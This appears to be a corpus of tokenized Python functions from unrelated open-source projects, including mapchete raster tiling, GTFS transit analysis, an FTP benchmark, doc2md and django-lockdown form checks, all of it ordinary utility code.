def screenshot ( url , * args , * * kwargs ) : phantomscript = os . path . join ( os . path . dirname ( __file__ ) , 'take_screenshot.js' ) directory = kwargs . get ( 'save_dir' , '/tmp' ) image_name = kwargs . get ( 'image_name' , None ) or _image_name_from_url ( url ) ext = kwargs . get ( 'format' , 'png' ) . lower ( ) save_path = os . path . join ( directory , image_name ) + '.' + ext crop_to_visible = kwargs . get ( 'crop_to_visible' , False ) cmd_args = [ 'phantomjs' , '--ssl-protocol=any' , phantomscript , url , '--width' , str ( kwargs [ 'width' ] ) , '--height' , str ( kwargs [ 'height' ] ) , '--useragent' , str ( kwargs [ 'user_agent' ] ) , '--dir' , directory , '--ext' , ext , '--name' , str ( image_name ) , ] if crop_to_visible : cmd_args . append ( '--croptovisible' ) # TODO: # - quality # - renderafter # - maxexecutiontime # - resourcetimeout output = subprocess . Popen ( cmd_args , stdout = subprocess . PIPE ) . communicate ( ) [ 0 ] return Screenshot ( save_path , directory , image_name + '.' + ext , ext )
def _image_name_from_url ( url ) : find = r'https?://|[^\w]' replace = '_' return re . sub ( find , replace , url ) . strip ( '_' )
def release ( self ) : if self . value is not None : self . value += 1 if self . value > self . maximum_value : raise ValueError ( "Too many releases" )
def connect ( ) : ftp_class = ftplib . FTP if not SSL else ftplib . FTP_TLS ftp = ftp_class ( timeout = TIMEOUT ) ftp . connect ( HOST , PORT ) ftp . login ( USER , PASSWORD ) if SSL : ftp . prot_p ( ) # secure data connection return ftp
def bytes_per_second ( ftp , retr = True ) : tot_bytes = 0 if retr : def request_file ( ) : ftp . voidcmd ( 'TYPE I' ) conn = ftp . transfercmd ( "retr " + TESTFN ) return conn with contextlib . closing ( request_file ( ) ) as conn : register_memory ( ) stop_at = time . time ( ) + 1.0 while stop_at > time . time ( ) : chunk = conn . recv ( BUFFER_LEN ) if not chunk : a = time . time ( ) ftp . voidresp ( ) conn . close ( ) conn = request_file ( ) stop_at += time . time ( ) - a tot_bytes += len ( chunk ) try : while chunk : chunk = conn . recv ( BUFFER_LEN ) ftp . voidresp ( ) conn . close ( ) except ( ftplib . error_temp , ftplib . error_perm ) : pass else : ftp . voidcmd ( 'TYPE I' ) with contextlib . closing ( ftp . transfercmd ( "STOR " + TESTFN ) ) as conn : register_memory ( ) chunk = b'x' * BUFFER_LEN stop_at = time . time ( ) + 1 while stop_at > time . time ( ) : tot_bytes += conn . send ( chunk ) ftp . voidresp ( ) return tot_bytes
def clone ( self ) : return StreamThrottle ( read = self . read . clone ( ) , write = self . write . clone ( ) )
def _get_zoom_level ( zoom , process ) : if zoom is None : return reversed ( process . config . zoom_levels ) if isinstance ( zoom , int ) : return [ zoom ] elif len ( zoom ) == 2 : return reversed ( range ( min ( zoom ) , max ( zoom ) + 1 ) ) elif len ( zoom ) == 1 : return zoom
def _process_worker ( process , process_tile ) : logger . debug ( ( process_tile . id , "running on %s" % current_process ( ) . name ) ) # skip execution if overwrite is disabled and tile exists if ( process . config . mode == "continue" and process . config . output . tiles_exist ( process_tile ) ) : logger . debug ( ( process_tile . id , "tile exists, skipping" ) ) return ProcessInfo ( tile = process_tile , processed = False , process_msg = "output already exists" , written = False , write_msg = "nothing written" ) # execute on process tile else : with Timer ( ) as t : try : output = process . execute ( process_tile , raise_nodata = True ) except MapcheteNodataTile : output = None processor_message = "processed in %s" % t logger . debug ( ( process_tile . id , processor_message ) ) writer_info = process . write ( process_tile , output ) return ProcessInfo ( tile = process_tile , processed = True , process_msg = processor_message , written = writer_info . written , write_msg = writer_info . write_msg )
def _extract ( self , in_tile = None , in_data = None , out_tile = None ) : return self . config . output . extract_subset ( input_data_tiles = [ ( in_tile , in_data ) ] , out_tile = out_tile )
def pyramid ( input_raster , output_dir , pyramid_type = None , output_format = None , resampling_method = None , scale_method = None , zoom = None , bounds = None , overwrite = False , debug = False ) : bounds = bounds if bounds else None options = dict ( pyramid_type = pyramid_type , scale_method = scale_method , output_format = output_format , resampling = resampling_method , zoom = zoom , bounds = bounds , overwrite = overwrite ) raster2pyramid ( input_raster , output_dir , options )
def raster2pyramid ( input_file , output_dir , options ) : pyramid_type = options [ "pyramid_type" ] scale_method = options [ "scale_method" ] output_format = options [ "output_format" ] resampling = options [ "resampling" ] zoom = options [ "zoom" ] bounds = options [ "bounds" ] mode = "overwrite" if options [ "overwrite" ] else "continue" # Prepare process parameters minzoom , maxzoom = _get_zoom ( zoom , input_file , pyramid_type ) with rasterio . open ( input_file , "r" ) as input_raster : output_bands = input_raster . count input_dtype = input_raster . dtypes [ 0 ] output_dtype = input_raster . dtypes [ 0 ] nodataval = input_raster . nodatavals [ 0 ] nodataval = nodataval if nodataval else 0 if output_format == "PNG" and output_bands > 3 : output_bands = 3 output_dtype = 'uint8' scales_minmax = ( ) if scale_method == "dtype_scale" : for index in range ( 1 , output_bands + 1 ) : scales_minmax += ( DTYPE_RANGES [ input_dtype ] , ) elif scale_method == "minmax_scale" : for index in range ( 1 , output_bands + 1 ) : band = input_raster . read ( index ) scales_minmax += ( ( band . min ( ) , band . max ( ) ) , ) elif scale_method == "crop" : for index in range ( 1 , output_bands + 1 ) : scales_minmax += ( ( 0 , 255 ) , ) if input_dtype == "uint8" : scale_method = None scales_minmax = ( ) for index in range ( 1 , output_bands + 1 ) : scales_minmax += ( ( None , None ) , ) # Create configuration config = dict ( process = "mapchete.processes.pyramid.tilify" , output = { "path" : output_dir , "format" : output_format , "bands" : output_bands , "dtype" : output_dtype } , pyramid = dict ( pixelbuffer = 5 , grid = pyramid_type ) , scale_method = scale_method , scales_minmax = scales_minmax , input = { "raster" : input_file } , config_dir = os . getcwd ( ) , zoom_levels = dict ( min = minzoom , max = maxzoom ) , nodataval = nodataval , resampling = resampling , bounds = bounds , baselevel = { "zoom" : maxzoom , "resampling" : resampling } , mode = mode ) # create process with mapchete . open ( config , zoom = zoom , bounds = bounds ) as mp : # prepare output directory if not os . path . exists ( output_dir ) : os . makedirs ( output_dir ) # run process mp . batch_process ( zoom = [ minzoom , maxzoom ] )
def _get_zoom ( zoom , input_raster , pyramid_type ) : if not zoom : minzoom = 1 maxzoom = get_best_zoom_level ( input_raster , pyramid_type ) elif len ( zoom ) == 1 : minzoom = zoom [ 0 ] maxzoom = zoom [ 0 ] elif len ( zoom ) == 2 : if zoom [ 0 ] < zoom [ 1 ] : minzoom = zoom [ 0 ] maxzoom = zoom [ 1 ] else : minzoom = zoom [ 1 ] maxzoom = zoom [ 0 ] return minzoom , maxzoom
def get_hash ( x ) : if isinstance ( x , str ) : return hash ( x ) elif isinstance ( x , dict ) : return hash ( yaml . dump ( x ) )
def get_zoom_levels ( process_zoom_levels = None , init_zoom_levels = None ) : process_zoom_levels = _validate_zooms ( process_zoom_levels ) if init_zoom_levels is None : return process_zoom_levels else : init_zoom_levels = _validate_zooms ( init_zoom_levels ) if not set ( init_zoom_levels ) . issubset ( set ( process_zoom_levels ) ) : raise MapcheteConfigError ( "init zooms must be a subset of process zoom" ) return init_zoom_levels
def _raw_at_zoom ( config , zooms ) : params_per_zoom = { } for zoom in zooms : params = { } for name , element in config . items ( ) : if name not in _RESERVED_PARAMETERS : out_element = _element_at_zoom ( name , element , zoom ) if out_element is not None : params [ name ] = out_element params_per_zoom [ zoom ] = params return params_per_zoom
def _filter_by_zoom ( element = None , conf_string = None , zoom = None ) : for op_str , op_func in [ # order of operators is important: # prematurely return in cases of "<=" or ">=", otherwise # _strip_zoom() cannot parse config strings starting with "<" # or ">" ( "=" , operator . eq ) , ( "<=" , operator . le ) , ( ">=" , operator . ge ) , ( "<" , operator . lt ) , ( ">" , operator . gt ) , ] : if conf_string . startswith ( op_str ) : return element if op_func ( zoom , _strip_zoom ( conf_string , op_str ) ) else None
def _strip_zoom ( input_string , strip_string ) : try : return int ( input_string . strip ( strip_string ) ) except Exception as e : raise MapcheteConfigError ( "zoom level could not be determined: %s" % e )
def _flatten_tree ( tree , old_path = None ) : flat_tree = [ ] for key , value in tree . items ( ) : new_path = "/" . join ( [ old_path , key ] ) if old_path else key if isinstance ( value , dict ) and "format" not in value : flat_tree . extend ( _flatten_tree ( value , old_path = new_path ) ) else : flat_tree . append ( ( new_path , value ) ) return flat_tree
def _unflatten_tree ( flat ) : tree = { } for key , value in flat . items ( ) : path = key . split ( "/" ) # we are at the end of a branch if len ( path ) == 1 : tree [ key ] = value # there are more branches else : # create new dict if not path [ 0 ] in tree : tree [ path [ 0 ] ] = _unflatten_tree ( { "/" . join ( path [ 1 : ] ) : value } ) # add keys to existing dict else : branch = _unflatten_tree ( { "/" . join ( path [ 1 : ] ) : value } ) if not path [ 1 ] in tree [ path [ 0 ] ] : tree [ path [ 0 ] ] [ path [ 1 ] ] = branch [ path [ 1 ] ] else : tree [ path [ 0 ] ] [ path [ 1 ] ] . update ( branch [ path [ 1 ] ] ) return tree
def bounds ( self ) : if self . _raw [ "bounds" ] is None : return self . process_pyramid . bounds else : return Bounds ( * _validate_bounds ( self . _raw [ "bounds" ] ) )
def output ( self ) : output_params = dict ( self . _raw [ "output" ] , grid = self . output_pyramid . grid , pixelbuffer = self . output_pyramid . pixelbuffer , metatiling = self . output_pyramid . metatiling ) if "path" in output_params : output_params . update ( path = absolute_path ( path = output_params [ "path" ] , base_dir = self . config_dir ) ) if "format" not in output_params : raise MapcheteConfigError ( "output format not specified" ) if output_params [ "format" ] not in available_output_formats ( ) : raise MapcheteConfigError ( "format %s not available in %s" % ( output_params [ "format" ] , str ( available_output_formats ( ) ) ) ) writer = load_output_writer ( output_params ) try : writer . is_valid_with_config ( output_params ) except Exception as e : logger . exception ( e ) raise MapcheteConfigError ( "driver %s not compatible with configuration: %s" % ( writer . METADATA [ "driver_name" ] , e ) ) return writer
def profile ( self ) : with rasterio . open ( self . path , "r" ) as src : return deepcopy ( src . meta )
def _get_band_indexes ( self , indexes = None ) : if indexes : if isinstance ( indexes , list ) : return indexes else : return [ indexes ] else : return range ( 1 , self . raster_file . profile [ "count" ] + 1 )
def execute ( mapchete_files , zoom = None , bounds = None , point = None , wkt_geometry = None , tile = None , overwrite = False , multi = None , input_file = None , logfile = None , verbose = False , no_pbar = False , debug = False , max_chunksize = None , vrt = False , idx_out_dir = None ) : multi = multi if multi else cpu_count ( ) mode = "overwrite" if overwrite else "continue" # send verbose messages to /dev/null if not activated if debug or not verbose : verbose_dst = open ( os . devnull , 'w' ) else : verbose_dst = sys . stdout for mapchete_file in mapchete_files : tqdm . tqdm . write ( "preparing to process %s" % mapchete_file , file = verbose_dst ) with click_spinner . spinner ( disable = debug ) as spinner : # process single tile if tile : tile = raw_conf_process_pyramid ( raw_conf ( mapchete_file ) ) . tile ( * tile ) with mapchete . open ( mapchete_file , mode = mode , bounds = tile . bounds , zoom = tile . zoom , single_input_file = input_file ) as mp : spinner . stop ( ) tqdm . tqdm . write ( "processing 1 tile" , file = verbose_dst ) # run process on tile for result in mp . batch_processor ( tile = tile ) : utils . write_verbose_msg ( result , dst = verbose_dst ) tqdm . tqdm . write ( "processing %s finished" % mapchete_file , file = verbose_dst ) # write VRT index if vrt : tqdm . tqdm . write ( "creating VRT" , file = verbose_dst ) for tile in tqdm . tqdm ( zoom_index_gen ( mp = mp , zoom = tile . zoom , out_dir = ( idx_out_dir if idx_out_dir else mp . config . output . path ) , vrt = vrt , ) , total = mp . count_tiles ( tile . zoom , tile . zoom ) , unit = "tile" , disable = debug or no_pbar ) : logger . debug ( "%s indexed" , tile ) tqdm . tqdm . write ( "VRT(s) creation for %s finished" % mapchete_file , file = verbose_dst ) # process area else : with mapchete . open ( mapchete_file , mode = mode , zoom = zoom , bounds = bounds_from_opts ( wkt_geometry = wkt_geometry , point = point , bounds = bounds , raw_conf = raw_conf ( mapchete_file ) ) , single_input_file = input_file ) as mp : spinner . stop ( ) tiles_count = mp . count_tiles ( min ( mp . config . init_zoom_levels ) , max ( mp . config . init_zoom_levels ) ) tqdm . tqdm . write ( "processing %s tile(s) on %s worker(s)" % ( tiles_count , multi ) , file = verbose_dst ) # run process on tiles for process_info in tqdm . tqdm ( mp . batch_processor ( multi = multi , zoom = zoom , max_chunksize = max_chunksize ) , total = tiles_count , unit = "tile" , disable = debug or no_pbar ) : utils . write_verbose_msg ( process_info , dst = verbose_dst ) tqdm . tqdm . write ( "processing %s finished" % mapchete_file , file = verbose_dst ) # write VRT index if vrt : tqdm . tqdm . write ( "creating VRT(s)" , file = verbose_dst ) for tile in tqdm . tqdm ( zoom_index_gen ( mp = mp , zoom = mp . config . init_zoom_levels , out_dir = ( idx_out_dir if idx_out_dir else mp . config . output . path ) , vrt = vrt ) , total = mp . count_tiles ( min ( mp . config . init_zoom_levels ) , max ( mp . config . init_zoom_levels ) ) , unit = "tile" , disable = debug or no_pbar ) : logger . debug ( "%s indexed" , tile ) tqdm . tqdm . write ( "VRT(s) creation for %s finished" % mapchete_file , file = verbose_dst )
def write_output_metadata ( output_params ) : if "path" in output_params : metadata_path = os . path . join ( output_params [ "path" ] , "metadata.json" ) logger . debug ( "check for output %s" , metadata_path ) try : existing_params = read_output_metadata ( metadata_path ) logger . debug ( "%s exists" , metadata_path ) logger . debug ( "existing output parameters: %s" , pformat ( existing_params ) ) existing_tp = existing_params [ "pyramid" ] current_params = params_to_dump ( output_params ) logger . debug ( "current output parameters: %s" , pformat ( current_params ) ) current_tp = BufferedTilePyramid ( * * current_params [ "pyramid" ] ) if existing_tp != current_tp : raise MapcheteConfigError ( "pyramid definitions between existing and new output do not match: " "%s != %s" % ( existing_tp , current_tp ) ) existing_format = existing_params [ "driver" ] [ "format" ] current_format = current_params [ "driver" ] [ "format" ] if existing_format != current_format : raise MapcheteConfigError ( "existing output format does not match new output format: " "%s != %s" % ( ( existing_format , current_format ) ) ) except FileNotFoundError : logger . debug ( "%s does not exist" , metadata_path ) dump_params = params_to_dump ( output_params ) # dump output metadata write_json ( metadata_path , dump_params ) else : logger . debug ( "no path parameter found" )
def _get_contour_values ( min_val , max_val , base = 0 , interval = 100 ) : i = base out = [ ] if min_val < base : while i >= min_val : i -= interval while i <= max_val : if i >= min_val : out . append ( i ) i += interval return out
def create ( mapchete_file , process_file , out_format , out_path = None , pyramid_type = None , force = False ) : if os . path . isfile ( process_file ) or os . path . isfile ( mapchete_file ) : if not force : raise IOError ( "file(s) already exists" ) out_path = out_path if out_path else os . path . join ( os . getcwd ( ) , "output" ) # copy file template to target directory process_template = pkg_resources . resource_filename ( "mapchete.static" , "process_template.py" ) process_file = os . path . join ( os . getcwd ( ) , process_file ) copyfile ( process_template , process_file ) # modify and copy mapchete file template to target directory mapchete_template = pkg_resources . resource_filename ( "mapchete.static" , "mapchete_template.mapchete" ) output_options = dict ( format = out_format , path = out_path , * * FORMAT_MANDATORY [ out_format ] ) pyramid_options = { 'grid' : pyramid_type } substitute_elements = { 'process_file' : process_file , 'output' : dump ( { 'output' : output_options } , default_flow_style = False ) , 'pyramid' : dump ( { 'pyramid' : pyramid_options } , default_flow_style = False ) } with open ( mapchete_template , 'r' ) as config_template : config = Template ( config_template . read ( ) ) customized_config = config . substitute ( substitute_elements ) with open ( mapchete_file , 'w' ) as target_config : target_config . write ( customized_config )
def to_dict ( self ) : return dict ( grid = self . grid . to_dict ( ) , metatiling = self . metatiling , tile_size = self . tile_size , pixelbuffer = self . pixelbuffer )
def is_on_edge ( self ) : return ( self . left <= self . tile_pyramid . left or # touches_left self . bottom <= self . tile_pyramid . bottom or # touches_bottom self . right >= self . tile_pyramid . right or # touches_right self . top >= self . tile_pyramid . top # touches_top )
def _get_band_indexes ( self , indexes = None ) : if indexes : if isinstance ( indexes , list ) : return indexes else : return [ indexes ] else : return range ( 1 , self . process . config . output . profile ( self . tile ) [ "count" ] + 1 )
def create_app ( mapchete_files = None , zoom = None , bounds = None , single_input_file = None , mode = "continue" , debug = None ) : from flask import Flask , render_template_string app = Flask ( __name__ ) mapchete_processes = { os . path . splitext ( os . path . basename ( mapchete_file ) ) [ 0 ] : mapchete . open ( mapchete_file , zoom = zoom , bounds = bounds , single_input_file = single_input_file , mode = mode , with_cache = True , debug = debug ) for mapchete_file in mapchete_files } mp = next ( iter ( mapchete_processes . values ( ) ) ) pyramid_type = mp . config . process_pyramid . grid pyramid_srid = mp . config . process_pyramid . crs . to_epsg ( ) process_bounds = "," . join ( [ str ( i ) for i in mp . config . bounds_at_zoom ( ) ] ) grid = "g" if pyramid_srid == 3857 else "WGS84" web_pyramid = BufferedTilePyramid ( pyramid_type ) @ app . route ( '/' , methods = [ 'GET' ] ) def index ( ) : """Render and hosts the appropriate OpenLayers instance.""" return render_template_string ( pkgutil . get_data ( 'mapchete.static' , 'index.html' ) . decode ( "utf-8" ) , srid = pyramid_srid , process_bounds = process_bounds , is_mercator = ( pyramid_srid == 3857 ) , process_names = mapchete_processes . keys ( ) ) @ app . route ( "/" . join ( [ "" , "wmts_simple" , "1.0.0" , "<string:mp_name>" , "default" , grid , "<int:zoom>" , "<int:row>" , "<int:col>.<string:file_ext>" ] ) , methods = [ 'GET' ] ) def get ( mp_name , zoom , row , col , file_ext ) : """Return processed, empty or error (in pink color) tile.""" logger . debug ( "received tile (%s, %s, %s) for process %s" , zoom , row , col , mp_name ) # convert zoom, row, col into tile object using web pyramid return _tile_response ( mapchete_processes [ mp_name ] , web_pyramid . tile ( zoom , row , col ) , debug ) return app
def _get_warped_array ( input_file = None , indexes = None , dst_bounds = None , dst_shape = None , dst_crs = None , resampling = None , src_nodata = None , dst_nodata = None ) : try : return _rasterio_read ( input_file = input_file , indexes = indexes , dst_bounds = dst_bounds , dst_shape = dst_shape , dst_crs = dst_crs , resampling = resampling , src_nodata = src_nodata , dst_nodata = dst_nodata ) except Exception as e : logger . exception ( "error while reading file %s: %s" , input_file , e ) raise
def _shift_required ( tiles ) : if tiles [ 0 ] [ 0 ] . tile_pyramid . is_global : # get set of tile columns tile_cols = sorted ( list ( set ( [ t [ 0 ] . col for t in tiles ] ) ) ) # if tile columns are an unbroken sequence, tiles are connected and are not # passing the Antimeridian if tile_cols == list ( range ( min ( tile_cols ) , max ( tile_cols ) + 1 ) ) : return False else : # look at column gaps and try to determine the smallest distance def gen_groups ( items ) : """Groups tile columns by sequence.""" j = items [ 0 ] group = [ j ] for i in items [ 1 : ] : # item is next in expected sequence if i == j + 1 : group . append ( i ) # gap occured, so yield existing group and create new one else : yield group group = [ i ] j = i yield group groups = list ( gen_groups ( tile_cols ) ) # in case there is only one group, don't shift if len ( groups ) == 1 : return False # distance between first column of first group and last column of last group normal_distance = groups [ - 1 ] [ - 1 ] - groups [ 0 ] [ 0 ] # distance between last column of first group and last column of first group # but crossing the antimeridian antimeridian_distance = ( groups [ 0 ] [ - 1 ] + tiles [ 0 ] [ 0 ] . tile_pyramid . matrix_width ( tiles [ 0 ] [ 0 ] . zoom ) ) - groups [ - 1 ] [ 0 ] # return whether distance over antimeridian is shorter return antimeridian_distance < normal_distance else : return False
def write_json ( path , params ) : logger . debug ( "write %s to %s" , params , path ) if path . startswith ( "s3://" ) : bucket = get_boto3_bucket ( path . split ( "/" ) [ 2 ] ) key = "/" . join ( path . split ( "/" ) [ 3 : ] ) logger . debug ( "upload %s" , key ) bucket . put_object ( Key = key , Body = json . dumps ( params , sort_keys = True , indent = 4 ) ) else : makedirs ( os . path . dirname ( path ) ) with open ( path , 'w' ) as dst : json . dump ( params , dst , sort_keys = True , indent = 4 )
def read_json ( path ) : if path . startswith ( ( "http://" , "https://" ) ) : try : return json . loads ( urlopen ( path ) . read ( ) . decode ( ) ) except HTTPError : raise FileNotFoundError ( "%s not found" , path ) elif path . startswith ( "s3://" ) : bucket = get_boto3_bucket ( path . split ( "/" ) [ 2 ] ) key = "/" . join ( path . split ( "/" ) [ 3 : ] ) for obj in bucket . objects . filter ( Prefix = key ) : if obj . key == key : return json . loads ( obj . get ( ) [ 'Body' ] . read ( ) . decode ( ) ) raise FileNotFoundError ( "%s not found" , path ) else : try : with open ( path , "r" ) as src : return json . loads ( src . read ( ) ) except : raise FileNotFoundError ( "%s not found" , path )
def _get_digest ( self ) : return hmac . new ( self . _secret , request . data , hashlib . sha1 ) . hexdigest ( ) if self . _secret else None
def long_description ( ) : import argparse parser = argparse . ArgumentParser ( ) parser . add_argument ( '--doc' , dest = "doc" , action = "store_true" , default = False ) args , sys . argv = parser . parse_known_args ( sys . argv ) if args . doc : import doc2md , pypandoc md = doc2md . doc2md ( doc2md . __doc__ , "doc2md" , toc = False ) long_description = pypandoc . convert ( md , 'rst' , format = 'md' ) else : return None
def find_sections ( lines ) : sections = [ ] for line in lines : if is_heading ( line ) : sections . append ( get_heading ( line ) ) return sections
def make_toc ( sections , maxdepth = 0 ) : if not sections : return [ ] outer = min ( n for n , t in sections ) refs = [ ] for ind , sec in sections : if maxdepth and ind - outer + 1 > maxdepth : continue ref = sec . lower ( ) ref = ref . replace ( '`' , '' ) ref = ref . replace ( ' ' , '-' ) ref = ref . replace ( '?' , '' ) refs . append ( "    " * ( ind - outer ) + "- [%s](#%s)" % ( sec , ref ) ) return refs
def doc2md ( docstr , title , min_level = 1 , more_info = False , toc = True , maxdepth = 0 ) : text = doctrim ( docstr ) lines = text . split ( '\n' ) sections = find_sections ( lines ) if sections : level = min ( n for n , t in sections ) - 1 else : level = 1 shiftlevel = 0 if level < min_level : shiftlevel = min_level - level level = min_level sections = [ ( lev + shiftlevel , tit ) for lev , tit in sections ] head = next ( ( i for i , l in enumerate ( lines ) if is_heading ( l ) ) , 0 ) md = [ make_heading ( level , title ) , "" , ] + lines [ : head ] if toc : md += make_toc ( sections , maxdepth ) md += [ '' ] md += _doc2md ( lines [ head : ] , shiftlevel ) if more_info : return ( md , sections ) else : return "\n" . join ( md )
def mod2md ( module , title , title_api_section , toc = True , maxdepth = 0 ) : docstr = module . __doc__ text = doctrim ( docstr ) lines = text . split ( '\n' ) sections = find_sections ( lines ) if sections : level = min ( n for n , t in sections ) - 1 else : level = 1 api_md = [ ] api_sec = [ ] if title_api_section and module . __all__ : sections . append ( ( level + 1 , title_api_section ) ) for name in module . __all__ : api_sec . append ( ( level + 2 , "`" + name + "`" ) ) api_md += [ '' , '' ] entry = module . __dict__ [ name ] if entry . __doc__ : md , sec = doc2md ( entry . __doc__ , "`" + name + "`" , min_level = level + 2 , more_info = True , toc = False ) api_sec += sec api_md += md sections += api_sec # headline head = next ( ( i for i , l in enumerate ( lines ) if is_heading ( l ) ) , 0 ) md = [ make_heading ( level , title ) , "" , ] + lines [ : head ] # main sections if toc : md += make_toc ( sections , maxdepth ) md += [ '' ] md += _doc2md ( lines [ head : ] ) # API section md += [ '' , '' , make_heading ( level + 1 , title_api_section ) , ] if toc : md += [ '' ] md += make_toc ( api_sec , 1 ) md += api_md return "\n" . join ( md )
def get_min_visit_time ( self ) : if not self . visit_events : return float ( 'inf' ) else : return min ( self . visit_events , key = lambda event : event . arr_time_ut ) . arr_time_ut
def can_infect ( self , event ) : if event . from_stop_I != self . stop_I : return False if not self . has_been_visited ( ) : return False else : time_sep = event . dep_time_ut - self . get_min_visit_time ( ) # if the gap between the earliest visit_time and current time is # smaller than the min. transfer time, the stop can pass the spreading # forward if ( time_sep >= self . min_transfer_time ) or ( event . trip_I == - 1 and time_sep >= 0 ) : return True else : for visit in self . visit_events : # if no transfer, please hop-on if ( event . trip_I == visit . trip_I ) and ( time_sep >= 0 ) : return True return False
def createcolorbar ( cmap , norm ) : cax , kw = matplotlib . colorbar . make_axes ( matplotlib . pyplot . gca ( ) ) c = matplotlib . colorbar . ColorbarBase ( cax , cmap = cmap , norm = norm ) return c
def _scan_footpaths_to_departure_stop ( self , connection_dep_stop , connection_dep_time , arrival_time_target ) : for _ , neighbor , data in self . _walk_network . edges_iter ( nbunch = [ connection_dep_stop ] , data = True ) : d_walk = data [ 'd_walk' ] neighbor_dep_time = connection_dep_time - d_walk / self . _walk_speed pt = LabelTimeSimple ( departure_time = neighbor_dep_time , arrival_time_target = arrival_time_target ) self . _stop_profiles [ neighbor ] . update_pareto_optimal_tuples ( pt )
def _finalize_profiles ( self ) : for stop , stop_profile in self . _stop_profiles . items ( ) : assert ( isinstance ( stop_profile , NodeProfileMultiObjective ) ) neighbor_label_bags = [ ] walk_durations_to_neighbors = [ ] departure_arrival_stop_pairs = [ ] if stop_profile . get_walk_to_target_duration ( ) != 0 and stop in self . _walk_network . node : neighbors = networkx . all_neighbors ( self . _walk_network , stop ) for neighbor in neighbors : neighbor_profile = self . _stop_profiles [ neighbor ] assert ( isinstance ( neighbor_profile , NodeProfileMultiObjective ) ) neighbor_real_connection_labels = neighbor_profile . get_labels_for_real_connections ( ) neighbor_label_bags . append ( neighbor_real_connection_labels ) walk_durations_to_neighbors . append ( int ( self . _walk_network . get_edge_data ( stop , neighbor ) [ "d_walk" ] / self . _walk_speed ) ) departure_arrival_stop_pairs . append ( ( stop , neighbor ) ) stop_profile . finalize ( neighbor_label_bags , walk_durations_to_neighbors , departure_arrival_stop_pairs )
def validate_day_start_ut ( conn ) : G = GTFS ( conn ) cur = conn . execute ( 'SELECT date, day_start_ut FROM days' ) for date , day_start_ut in cur : #print date, day_start_ut assert day_start_ut == G . get_day_start_ut ( date )
def main_make_views ( gtfs_fname ) : print ( "creating views" ) conn = GTFS ( fname_or_conn = gtfs_fname ) . conn for L in Loaders : L ( None ) . make_views ( conn ) conn . commit ( )
def _run ( self ) : if self . _has_run : raise RuntimeError ( "This spreader instance has already been run: " "create a new Spreader object for a new run." ) i = 1 while self . event_heap . size ( ) > 0 and len ( self . _uninfected_stops ) > 0 : event = self . event_heap . pop_next_event ( ) this_stop = self . _stop_I_to_spreading_stop [ event . from_stop_I ] if event . arr_time_ut > self . start_time_ut + self . max_duration_ut : break if this_stop . can_infect ( event ) : target_stop = self . _stop_I_to_spreading_stop [ event . to_stop_I ] already_visited = target_stop . has_been_visited ( ) target_stop . visit ( event ) if not already_visited : self . _uninfected_stops . remove ( event . to_stop_I ) print ( i , self . event_heap . size ( ) ) transfer_distances = self . gtfs . get_straight_line_transfer_distances ( event . to_stop_I ) self . event_heap . add_walk_events_to_heap ( transfer_distances , event , self . start_time_ut , self . walk_speed , self . _uninfected_stops , self . max_duration_ut ) i += 1 self . _has_run = True
def insert_data ( self , conn ) : cur = conn . cursor ( ) # This is a bit hackish.  It is annoying to have to write the # INSERT statement yourself and keep it up to date with the # table rows.  This gets the first row, figures out the field # names from that, and then makes an INSERT statement like # "INSERT INTO table (col1, col2, ...) VALUES (:col1, :col2, # ...)".  The ":col1" is sqlite syntax for named value. csv_reader_generators , prefixes = self . _get_csv_reader_generators ( ) for csv_reader , prefix in zip ( csv_reader_generators , prefixes ) : try : row = next ( iter ( self . gen_rows ( [ csv_reader ] , [ prefix ] ) ) ) fields = row . keys ( ) except StopIteration : # The file has *only* a header and no data. # next(iter()) yields StopIteration and we can't # proceed.  Since there is nothing to import, just continue the loop print ( "Not importing %s into %s for %s" % ( self . fname , self . table , prefix ) ) continue stmt = '''INSERT INTO %s (%s) VALUES (%s)''' % ( self . table , ( ', ' . join ( [ x for x in fields if x [ 0 ] != '_' ] + self . extra_keys ) ) , ( ', ' . join ( [ ":" + x for x in fields if x [ 0 ] != '_' ] + self . extra_values ) ) ) # This does the actual insertions.  Passed the INSERT # statement and then an iterator over dictionaries.  Each # dictionary is inserted. if self . print_progress : print ( 'Importing %s into %s for %s' % ( self . fname , self . table , prefix ) ) # the first row was consumed by fetching the fields # (this could be optimized) from itertools import chain rows = chain ( [ row ] , self . gen_rows ( [ csv_reader ] , [ prefix ] ) ) cur . executemany ( stmt , rows ) conn . commit ( )
def get_vehicle_hours_by_type ( gtfs , route_type ) : day = gtfs . get_suitable_date_for_daily_extract ( ) query = ( " SELECT * , SUM(end_time_ds - start_time_ds)/3600 as vehicle_hours_type" " FROM" " (SELECT * FROM day_trips as q1" " INNER JOIN" " (SELECT route_I, type FROM routes) as q2" " ON q1.route_I = q2.route_I" " WHERE type = {route_type}" " AND date = '{day}')" . format ( day = day , route_type = route_type ) ) df = gtfs . execute_custom_query_pandas ( query ) return df [ 'vehicle_hours_type' ] . item ( )
def clean_password ( self ) : value = self . cleaned_data . get ( 'password' ) if value not in self . valid_passwords : raise forms . ValidationError ( 'Incorrect password.' ) return value
def clean ( self ) : cleaned_data = super ( AuthForm , self ) . clean ( ) user = self . get_user ( ) if self . staff_only and ( not user or not user . is_staff ) : raise forms . ValidationError ( 'Sorry, only staff are allowed.' ) if self . superusers_only and ( not user or not user . is_superuser ) : raise forms . ValidationError ( 'Sorry, only superusers are allowed.' ) return cleaned_data
def get_lockdown_form ( form_path ) : if not form_path : raise ImproperlyConfigured ( 'No LOCKDOWN_FORM specified.' ) form_path_list = form_path . split ( "." ) new_module = "." . join ( form_path_list [ : - 1 ] ) attr = form_path_list [ - 1 ] try : mod = import_module ( new_module ) except ( ImportError , ValueError ) : raise ImproperlyConfigured ( 'Module configured in LOCKDOWN_FORM (%s) to' ' contain the form class couldn\'t be ' 'found.' % new_module ) try : form = getattr ( mod , attr ) except AttributeError : raise ImproperlyConfigured ( 'The module configured in LOCKDOWN_FORM ' ' (%s) doesn\'t define a "%s" form.' % ( new_module , attr ) ) return form
